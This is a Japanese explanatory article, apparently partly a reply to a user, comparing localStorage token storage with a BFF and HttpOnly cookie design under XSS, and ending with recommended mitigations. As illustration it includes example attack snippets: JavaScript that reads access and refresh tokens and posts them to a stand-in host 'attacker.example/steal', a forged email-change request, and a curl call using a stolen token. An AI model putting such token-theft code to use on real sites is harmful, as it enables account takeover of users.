
Web 認証情報の持ち方とリスク整理

1. まず前提：Cookie / Session / JWT は別レイヤーの概念

最初に混同しやすいのがここです。

Cookie  = ブラウザとサーバの間で値を保存・送信する仕組み

Session = ログイン状態を管理する仕組み

JWT     = 署名付きトークンの形式

つまり、次のような組み合わせがありえます。

|   |   |   |
|---|---|---|
|構成|ブラウザが持つもの|サーバ側が持つもの|
|従来の Cookie Session|session id|セッション情報|
|localStorage + JWT|access token / refresh token|基本は署名検証で判断|
|HttpOnly Cookie + BFF|session id|BFF が token / session を管理|
|Cookie に JWT|JWT|設計次第|

なので、本質は 「JWT か Cookie か」ではなく、ブラウザ上の JavaScript から読める場所に何を置くかです。

  

2. localStorage + token の構成

典型的にはこうです。

[Browser SPA]

  localStorage:

    access_token

    refresh_token

  

       ↓ Authorization: Bearer <access_token>

  

[API Server]

フロントエンドの JavaScript が localStorage から token を取り出して、API に付与します。

const token = localStorage.getItem("access_token")

  

fetch("https://api.example.com/me", {

  headers: {

    Authorization: `Bearer ${token}`,

  },

})

この構成のメリットはあります。

- API サーバ側をステートレスにしやすい

- SPA と API の分離に合いやすい

- モバイルアプリや外部 API と似た形にできる

- Authorization ヘッダーで扱いやすい

ただし、ブラウザ上の JavaScript から token を読めるので、XSS には弱いです。

  

3. BFF + HttpOnly Cookie の構成

BFF は Backend For Frontend のことです。

典型的にはこうです。

[Browser]

  HttpOnly Cookie:

    session_id

  

       ↓ Cookie 自動送信

  

[BFF]

  access_token / refresh_token を保持

  

       ↓ Authorization: Bearer <access_token>

  

[Backend API]

ブラウザは token を直接持ちません。  
ブラウザが持つのは、BFF とのセッションを表す Cookie だけです。

  

その Cookie に HttpOnly を付けると、JavaScript から Cookie の値を読みにくくできます。

Set-Cookie: __Host-session=abc123;

  Path=/;

  HttpOnly;

  Secure;

  SameSite=Lax

この構成の狙いは、

access token / refresh token をブラウザ JavaScript から隠すこと

です。

  

4. XSS が成立したら BFF でも攻撃はできる

ここが重要です。

BFF + HttpOnly Cookie にしても、XSS が成立したら攻撃はできます。

なぜなら、攻撃者の JavaScript は被害者のブラウザ上で動くからです。

例えば、攻撃者は次のようなリクエストを送れます。

fetch("/api/change-email", {

  method: "POST",

  credentials: "include",

  body: JSON.stringify({

    email: "attacker@example.com",

  }),

})

このとき、HttpOnly Cookie の値は JavaScript から読めません。

  

しかし、ブラウザは BFF へのリクエストに Cookie を自動送信します。

XSS が発火

  ↓

攻撃者 JS が fetch("/api/xxx") を実行

  ↓

ブラウザが HttpOnly Cookie を自動送信

  ↓

BFF は正規ユーザーからのリクエストとして処理

つまり、BFF + HttpOnly Cookie は XSS を無効化する仕組みではありません。

  

5. では localStorage + token と何が違うのか

差は、攻撃できるかどうかではありません。

差は、認証情報を盗んで外部に持ち帰れるかどうかです。

localStorage + token の場合

XSS が成立すると、攻撃者は token を読めます。

const accessToken = localStorage.getItem("access_token")

const refreshToken = localStorage.getItem("refresh_token")

  

fetch("https://attacker.example/steal", {

  method: "POST",

  body: JSON.stringify({

    accessToken,

    refreshToken,

  }),

})

盗まれた token は、攻撃者のサーバや別端末から使われます。

curl https://api.example.com/me \

  -H "Authorization: Bearer <stolen-access-token>"

つまり、攻撃者は被害者のブラウザを離れても攻撃できます。

XSS が一度発火

  ↓

token を盗む

  ↓

攻撃者が token を外部に保存

  ↓

攻撃者の端末・サーバ・Bot から API を叩く

  ↓

token の有効期限まで攻撃可能

BFF + HttpOnly Cookie の場合

XSS が成立しても、通常は session id や token を JavaScript で読めません。

document.cookie

// HttpOnly Cookie は出てこない

そのため、攻撃者は基本的にこうなります。

被害者のブラウザ上で攻撃する

つまり、

XSS が発火している間

ユーザーがそのサイトを開いている間

その脆弱なページを踏んだタイミング

に依存します。

  

6. リスクの違いを一言でいうと

かなり大事な整理です。

BFF + HttpOnly Cookie:

  ユーザーのブラウザを一時的にリモコン操作されるリスク

  

localStorage + token:

  ユーザーのログイン鍵をコピーして持ち帰られるリスク

どちらも危険です。

ただし後者は、攻撃者がその場を離れても攻撃を継続しやすいです。

  

7. access token と refresh token の違い

ここも重要です。

access token

API を呼ぶための token です。

通常は比較的短命にします。

例:

5分

15分

30分

1時間

access token だけ盗まれた場合、攻撃できるのは基本的にその有効期限内です。

access token が 15分有効

  ↓

盗まれたら最大15分程度、攻撃に使われうる

refresh token

access token を再発行するための token です。

通常、access token より長命です。

例:

7日

30日

90日

数か月

refresh token まで盗まれると危険度が大きく上がります。

refresh token が盗まれる

  ↓

攻撃者が access token を再発行

  ↓

access token が切れても攻撃を継続

  ↓

数日〜数か月のなりすましに発展しうる

だから、localStorage に refresh token を置く設計は特に危険です。

  

8. BFF では refresh token をどこに置くのか

BFF 構成では、refresh token は通常サーバ側に置きます。

[Browser]

  session id だけ持つ

  HttpOnly Cookie

  

[BFF]

  access token

  refresh token

  

[IdP / API]

この場合、XSS が成立しても、ブラウザ JavaScript から refresh token を直接読むことはできません。

  

ここが大きな差です。

localStorage:

  refresh token がブラウザにある

  XSS で盗まれうる

  

BFF:

  refresh token はサーバ側にある

  XSS では直接盗みにくい

  

9. 「ブラウザを閉じれば終わる」のか

ここは少し注意が必要です。

BFF + HttpOnly Cookie でも、ブラウザを閉じたら必ず攻撃終了とは限りません。

理由は、Cookie とセッションの設計次第だからです。

例えば、

- Cookie が永続 Cookie

- セッション有効期限が長い

- ブラウザがセッション復元する

- XSS 脆弱性が修正されていない

- 攻撃コードが保存型 XSS として残っている

この場合、ユーザーが再びサイトを開いたときに、また攻撃が成立します。

ユーザーがサイトを開く

  ↓

XSS が再発火する

  ↓

HttpOnly Cookie が BFF に自動送信される

  ↓

攻撃者 JS が認証済み API を叩く

なので、ヒロさんの理解どおり、

  

BFF + HttpOnly Cookie でも、セッション ID の保持期間が長く、XSS が修正されないままであれば、ユーザーがそのサイトにアクセスするたびに攻撃は成立しうる。

  

これは合っています。

  

ただし、それでも localStorage + token とは違います。

BFF + HttpOnly Cookie:

  ユーザーが再訪して XSS が発火するたびに攻撃できる

  

localStorage + token:

  一度 XSS が発火して token を盗めば、

  ユーザーが再訪しなくても攻撃できる

  

10. 攻撃の性質の違い

整理するとこうです。

|   |   |   |
|---|---|---|
|観点|BFF + HttpOnly Cookie|localStorage + token|
|XSS 中の攻撃|可能|可能|
|Cookie / token の読み取り|HttpOnly により困難|可能|
|認証情報の持ち出し|困難|容易|
|被害者ブラウザ外からの攻撃|しにくい|しやすい|
|一瞬の XSS での被害|その瞬間の操作中心|token 窃取により継続攻撃|
|refresh token 盗難|サーバ側保持なら直接盗みにくい|localStorage にあれば盗まれうる|
|XSS 未修正時|再訪のたびに攻撃されうる|初回訪問で token を盗まれうる|
|被害の広がり|client hijack 寄り|token theft / session hijack 寄り|

  

11. client hijack と session hijack の違い

この話は、次の2つに分けると理解しやすいです。

client hijack

被害者のブラウザ上で攻撃者の JavaScript が動く状態です。

攻撃者は被害者のブラウザを踏み台にする

BFF + HttpOnly Cookie で XSS が成立した場合は、主にこちらです。

被害者ブラウザ

  ↓ Cookie 自動送信

BFF

攻撃者は session id を直接持っていないので、被害者のブラウザに依存します。

session hijack / token theft

認証情報そのものを盗まれる状態です。

攻撃者が session id や token をコピーして持ち帰る

localStorage + token で XSS が成立した場合は、こちらに発展しやすいです。

被害者ブラウザ

  ↓ token を盗む

攻撃者サーバ

  ↓ token を使って API 呼び出し

API

これは被害者ブラウザに依存しません。

  

12. 具体的な攻撃シナリオ比較

シナリオA: 一瞬だけ XSS が発火した

BFF + HttpOnly Cookie

1. ユーザーが脆弱なページを開く

2. XSS が一瞬発火

3. 攻撃者 JS がその場で API 操作

4. ページを閉じる

5. session id は盗まれていない

被害はありえます。  
ただし、攻撃者が認証情報を持ち帰れていなければ、後続攻撃はしにくいです。

localStorage + token

1. ユーザーが脆弱なページを開く

2. XSS が一瞬発火

3. access token / refresh token を読み取る

4. 攻撃者サーバへ送信

5. 攻撃者が後から token を使う

一瞬の XSS でも、token 窃取に成功すれば攻撃が継続します。

  

シナリオB: XSS が修正されない

BFF + HttpOnly Cookie

ユーザーがサイトに来るたびに XSS が発火

  ↓

そのたびに認証済み操作が可能

これは普通に危険です。

ただし、攻撃者は毎回「ユーザーがそのサイトを開くこと」に依存します。

localStorage + token

初回訪問で token を盗む

  ↓

その後はユーザーがサイトを開かなくても攻撃可能

こちらは、攻撃者の自由度が高いです。

  

シナリオC: refresh token が盗まれた

BFF + HttpOnly Cookie

refresh token が BFF 側にあれば、ブラウザ XSS から直接盗むのは難しいです。

もちろん BFF 自体が侵害された場合は別です。

localStorage + token

refresh token が localStorage にあるなら、XSS で盗まれます。

refresh token 盗難

  ↓

access token 再発行

  ↓

長期間のなりすまし

この差はかなり大きいです。

  

13. BFF + HttpOnly Cookie の限界

BFF + HttpOnly Cookie は強いですが、万能ではありません。

防げるものと防げないものを分けるとこうです。

防ぎやすいもの

- JavaScript による session id の読み取り

- access token の窃取

- refresh token の窃取

- 攻撃者環境への token 持ち出し

- token を使った外部からの継続攻撃

防げないもの

- XSS そのもの

- XSS 中の認証済み API 操作

- ユーザーのブラウザを踏み台にした操作

- 画面上の情報の読み取り

- DOM 上に表示された個人情報の窃取

- CSRF 的な操作

つまり、BFF + HttpOnly Cookie は XSS 後の被害拡大を抑える対策であって、XSS 対策そのものではないです。

  

14. では何を対策すべきか

localStorage に置かない方がよいもの

- access token

- refresh token

- session id

- API key

- 個人情報

- 権限判断に使う情報

特に refresh token は危険です。

localStorage に置いてよいもの

盗まれても致命的でないものです。

- UI テーマ

- 表示設定

- 一時的な非機密キャッシュ

- チュートリアル既読フラグ

  

15. Cookie を使う場合の基本設定

BFF + HttpOnly Cookie では、最低限こういう属性を考えます。

Set-Cookie: __Host-session=xxxxx;

  Path=/;

  HttpOnly;

  Secure;

  SameSite=Lax

HttpOnly

JavaScript から Cookie を読みにくくします。

document.cookie で session id が取れない

Secure

HTTPS 通信でのみ Cookie を送信します。

SameSite

クロスサイトリクエスト時に Cookie を送るかを制御します。

Strict:

  最も厳しい

  外部サイトからの遷移でも Cookie が送られにくい

  

Lax:

  実用性と安全性のバランス

  一部のトップレベル遷移では Cookie が送られる

  

None:

  クロスサイトでも送る

  Secure 必須

__Host-

prefix

Cookie の固定化やスコープの事故を減らすために使えます。

条件は概ね、

- Secure が必要

- Domain を指定しない

- Path=/ が必要

です。

  

16. BFF でも必要な追加対策

BFF + HttpOnly Cookie にしても、次の対策は必要です。

XSS 対策

- 出力エスケープ

- HTML サニタイズ

- Markdown レンダリング時のサニタイズ

- dangerouslySetInnerHTML / innerHTML の慎重な利用

- CSP

- Trusted Types

- 依存ライブラリの更新

- npm パッケージのサプライチェーン対策

CSRF / session riding 対策

- SameSite=Lax / Strict

- CSRF token

- Origin ヘッダー検証

- Referer ヘッダー検証

- 状態変更操作は GET にしない

- 重要操作では再認証

セッション管理

- セッション有効期限を適切に短くする

- idle timeout を設ける

- absolute timeout を設ける

- ログアウト時にサーバ側セッションを破棄する

- 権限変更時にセッションを無効化する

- refresh token rotation を使う

- 異常な IP / User-Agent / 地理的変化を検知する

  

17. 実務判断の基本線

新規の Web アプリであれば、基本線はこうです。

ブラウザには高価値 token を持たせない

BFF かサーバ側で token を管理する

ブラウザとは HttpOnly Cookie でセッションを張る

特に避けたいのはこれです。

localStorage に refresh token を保存する

access token だけでもリスクはありますが、refresh token はより危険です。

  

18. 最終まとめ

ここまでの話を一文でまとめると、こうです。

BFF + HttpOnly Cookie でも、XSS が成立すればユーザーのブラウザを踏み台にした攻撃は可能。  
ただし、session id や access token / refresh token を JavaScript で読み取って外部へ持ち出しにくいため、攻撃者が被害者ブラウザ外から長期間・自由に攻撃するリスクを下げられる。  
一方、localStorage に token を置くと、XSS が一度成立しただけで token を盗まれ、access token の有効期限内、さらに refresh token まで盗まれれば数日〜数か月単位で攻撃される可能性がある。

かなり短くすると、これです。

BFF + HttpOnly Cookie:

  XSS 中は危険。

  ただし鍵はコピーされにくい。

  

localStorage + token:

  XSS 中も危険。

  さらに鍵をコピーして持ち帰られやすい。

なので、リスク差の本質はこれです。

XSS を防げるかどうかではなく、

XSS 後に認証情報を持ち出されるかどうか。

この整理で考えると、BFF + HttpOnly Cookie が推奨される理由がかなり見えやすくなります。